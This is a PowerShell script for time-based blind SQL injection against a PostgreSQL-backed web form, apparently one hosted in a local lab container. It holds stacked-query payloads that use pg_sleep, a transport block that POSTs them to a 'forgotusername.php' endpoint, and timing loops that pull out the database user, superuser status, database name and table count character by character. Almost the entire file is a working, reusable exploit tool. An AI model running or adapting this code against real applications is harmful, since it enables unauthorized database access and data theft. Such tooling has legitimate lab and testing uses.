<#
Valid characters for table/column names
#>
$CharacterSets = @{
  versionAsciiChars = @(46,48,49,50,51,52,53,54,55,56,57)
  printableChars= 32..127
}
<#
################################################
RAW SQLI STATEMENTS,
since this is mysql the number of columns in the union statement will vary by application BUT,
the general idea of a union statement applies, i.e finding a column that returns a string type and
using that as the base for the timebase blind
################################################
#>
$sanity_check = "SELECT CASE WHEN ( ( select length( (select 'a'))=1 ) ) THEN (select 1) ELSE (select 0) END;"
$strlen_sqli = "`"';SELECT CASE WHEN (( select length( ({0}))={1} )) THEN pg_sleep(10) ELSE pg_sleep(0) END;--"
$extract_char_sqli = "`"';SELECT CASE WHEN ( (  select ascii( SUBSTRING(({0}), {1}, 1) )={2} ) ) THEN pg_sleep(10) ELSE pg_sleep(0) END;--"
#$extract_count_sqli = "`"';SELECT CASE WHEN (select count(*) from information_schema.tables) THEN pg_sleep(10) ELSE pg_sleep(0) END;"
$eval_binary_stm_sqli = "`"';SELECT CASE WHEN (({0})) THEN pg_sleep(10) ELSE pg_sleep(0) END;--"

<#
##################################################
Fill this script block with whatever logic is responsible to sending to sqli payload to the application
##################################################
#>
$transport = {
  param($payload, $Uri)
  $body = "username=$payload"
  Invoke-WebRequest -Uri 'http://172.17.0.2/forgotusername.php' -Method Post -body $body -Proxy http://127.0.0.1:8080 | Out-Null
}

<#
#################################################
These are the scriptblocks that will be passed as
SQLISCRIPTBLOCK, See the examples
#################################################
#>
$getLength = {
  param($Query, $len)
  $strlen_sqli -f "$Query","$len"
}
$extractString = {
  param($query, $index, $char) 
  #$check_email -f $token, ($extract_char_sqli -f "$query","$index","$char")
  $extract_char_sqli -f "$query","$index","$char"
}
# getCount
$getCountTables = {
  param($BaseQuery, $len, $Query)
  $BaseQuery -f $token, ($extract_count_sqli -f "$Query","$len") 
}
$getQuery = {
  param($Query) 
  $eval_binary_stm_sqli -f "$Query"
}



# add super user

# database name
# select database
# number of tables in the database
# SELECT count(*) AS TOTALNUMBEROFTABLES FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'docedit';
# number of columns in a table
# SELECT count(*) AS anyName FROM information_schema.columns WHERE table_name ='yourTableName'
# Via Timebased Blind
function Get-StringLength {
  param (
    [Parameter(Mandatory=$true)]
    [scriptblock] $SQLIScriptBlock,
    [Parameter(Mandatory=$true)]
    [scriptblock] $TransportScriptBlock,
    [Parameter(Mandatory=$true)]
    [string] $Query,
    [Parameter(Mandatory=$true)]
    [int] $MaxLength,
    [Parameter(Mandatory=$false)]
    [int] $timeout=10
  )
  $len = 0 
  for($i = 1; $i -le $MaxLength; ++$i) {
    $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $Query, $i
    Write-Debug $guess
    $stopwatch = [System.Diagnostics.Stopwatch]::new()
    $stopwatch.Start()
    Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0
    $stopwatch.Stop()
    if($stopwatch.Elapsed.Seconds -ge $timeout) {
      Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
      $len = $i
      break
    }
    else { Write-Debug "$($stopwatch.Elapsed)" }
  }
  return $len
}

function Get-Count {
  param (
    [Parameter(Mandatory=$true)]
    [scriptblock] $SQLIScriptBlock,
    [Parameter(Mandatory=$true)]
    [scriptblock] $TransportScriptBlock,
    [Parameter(Mandatory=$true)]
    [string] $Query,
    [Parameter(Mandatory=$true)]
    [int] $MaxLength,
    [Parameter(Mandatory=$false)]
    [int] $timeout=10
  )
  $count = 0 
  for($i = 1; $i -le $MaxLength; ++$i) {
    $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $i,$Query
    Write-Debug $guess
    $stopwatch = [System.Diagnostics.Stopwatch]::new()
    $stopwatch.Start()
    Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0
    $stopwatch.Stop()
    if($stopwatch.Elapsed.Seconds -ge $timeout) {
      Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
      $count = $i
      break
    }
    else { Write-Debug "$($stopwatch.Elapsed)" }
  }
  return $count
}

function Get-String {
  param (
      [Parameter(Mandatory=$true)]
      [scriptblock] $SQLIScriptBlock,
      [Parameter(Mandatory=$true)]
      [scriptblock] $TransportScriptblock,
      [Parameter(Mandatory=$true)]
      [string] $Query,
      [Parameter(Mandatory=$true)]
      [int[]] $CharacterSet,
      [Parameter(Mandatory=$true)]
      [int] $Length,
      [Parameter(Mandatory=$false)]
      [int] $timeout=10
  )
  $extracted_string=""
  for($i = 1; $i -le $Length; ++$i) {
    for($j = 0; $j -lt $CharacterSet.length; ++$j) {
      #Write-Output "$($CharacterSets.versionAsciiChars[$j])"
      $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $Query, $i, $CharacterSet[$j]
      Write-Debug $guess
      $stopwatch = [System.Diagnostics.Stopwatch]::new()
      $stopwatch.Start()
      Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0 # second argument would be the uri websocket id etc
      #(Send-Message -Message $guess -SocketId 0).Msg
      #(Receive-Message -SocketId 0).Msg | Out-Null
      $stopwatch.Stop()
      if($stopwatch.Elapsed.Seconds -ge $timeout) {
        $temp = [int]$CharacterSet[$j]
        Write-Debug $temp 
        $temp = [char]$temp
        Write-Debug "Char Found: $temp"
        Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
        $extracted_string += $temp
        break
      }
      else {
      # Write-Output "$($stopwatch.Elapsed)"
      }
    }
  }
  return $extracted_string
}

function Get-Query {
  param (
    [Parameter(Mandatory=$true)]
    [scriptblock] $SQLIScriptBlock,
    [Parameter(Mandatory=$true)]
    [scriptblock] $TransportScriptBlock,
    [Parameter(Mandatory=$true)]
    [string] $Query,
    [Parameter(Mandatory=$false)]
    [int] $timeout=10
  )
  $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $Query
  Write-Debug $guess
  $stopwatch = [System.Diagnostics.Stopwatch]::new()
  $stopwatch.Start()
  Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0
  $stopwatch.Stop()
  if($stopwatch.Elapsed.Seconds -ge $timeout) {
    Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
    return $true
  }
  else { Write-Debug "$($stopwatch.Elapsed)" }
  return $false
}

# EXAMPLES

# Database version enumeration
<#
$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select version()" -MaxLength 200 -timeout 5
Write-Output "Database version string length: $len"
$db_version = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select version()" -Characterset $CharacterSets.printableChars -Length $len -timeout 5
Write-Output "Database version: $db_version"
#>
#Current User and user priviledges enumeration
$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select user" -MaxLength 20
Write-Output "Current User string length: $len"
$currentUser = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select user" -Characterset $CharacterSets.printableChars -Length $len
Write-Output "Current User: $currentUser"
$isSuperUser = Get-Query -SQLIScriptBlock $getQuery -TransportScriptBlock $transport -Query "SELECT current_setting('is_superuser') = 'on'" -Debug
Write-Output "Current User: $currentUser is superuser?: $isSuperUser"

# Database schema and Tables enumeration
$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select current_database()" -MaxLength 10
Write-Output "Schema string length: $len"
$schema = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select current_database()" -Characterset $CharacterSets.printableChars -Length $len
Write-Output "Schema Name: $schema"
$num_tables = 0
for($i = 0; $i -lt 200; ++$i) {
  $res = Get-Query -SQLIScriptBlock $getQuery -TransportScriptBlock $transport -Query "select(select count(*) from information_schema.tables) = $i"
  if($res -eq $true) {
      $num_tables = $i
      break
    }
}
Write-Output "Number of tables in $schema is $num_tables"
<#
$table_name_lengths = [System.Collections.ArrayList]::new()
$table_names = [System.Collections.ArrayList]::new()
for($i = 0; $i -lt $num_tables; ++$i) {
  $len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "SELECT table_name FROM information_schema.tables LIMIT $i,1" -MaxLength 30
  $table_name_lengths.Add($len)
  Write-Output "Table found with length: $len"
}
for($i = 0; $i -lt $num_tables; ++$i) {
  $table_name = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "SELECT table_name FROM information_schema.tables LIMIT $i,1" -Characterset $CharacterSets.printableChars -Length $table_name_lengths[$i]
  $table_names.Add($table_name)
  Write-Output "Found table: $table_name"
}
#>